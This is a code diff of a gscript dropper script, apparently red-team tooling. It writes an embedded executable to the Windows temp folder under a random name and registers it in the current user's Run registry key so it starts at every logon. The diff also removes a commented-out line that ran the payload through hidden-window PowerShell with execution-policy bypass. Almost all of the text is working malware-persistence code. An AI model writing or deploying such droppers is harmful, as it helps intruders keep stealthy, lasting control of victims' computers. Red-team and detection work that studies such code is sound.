@@ -7,19 +7,18 @@
 
 //priority:90
 //timeout:150
-//import:/private/tmp/example.exe
+
 //go_import:os as os
 //go_import:github.com/gen0cide/gscript/x/windows as windows
 
-var fn;
+//import:/private/tmp/example.exe
 
 function Deploy() {
   console.log("starting execution of Run Key Persistence");
   // Prep the sample
   var example = GetAssetAsBytes("example.exe");
   var temppath = os.TempDir();
-  //var naming = G.rand.GetAlphaString(5);
-  var naming = "examples";
+  var naming = G.rand.GetAlphaString(5);
   naming = naming.toLowerCase();
   var fullpath = temppath+"\\"+naming+".exe";
 
@@ -28,15 +27,13 @@ function Deploy() {
   errors = G.file.WriteFileFromBytes(fullpath, example[0]);
   console.log("errors: "+errors);
   
-  // Persist the sample -- NEED TO GET THE REG KEYS WORKING --
+  // Persist the sample
   windows.AddRegKeyString("CURRENT_USER", "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "ExampleExe", fullpath);
   console.log("Adding a reg key for current user run");
-
+  
   // Execute the sample
-  //var running = G.exec.ExecuteCommandAsync("powershell", ["-NoLogo", "-WindowStyle", "hidden", "-ep", "bypass", path.fullpath]);
-  //console.log("executed the example binary, errors: " + running[1]);
-
+  //var running = G.exec.ExecuteCommandAsync("fullpath", [""]);
+  //console.log("executed the example binary, errors: " + Dump(running[1]));
   console.log("done, deployed binary with run key persistence");
-
   return true;
 }
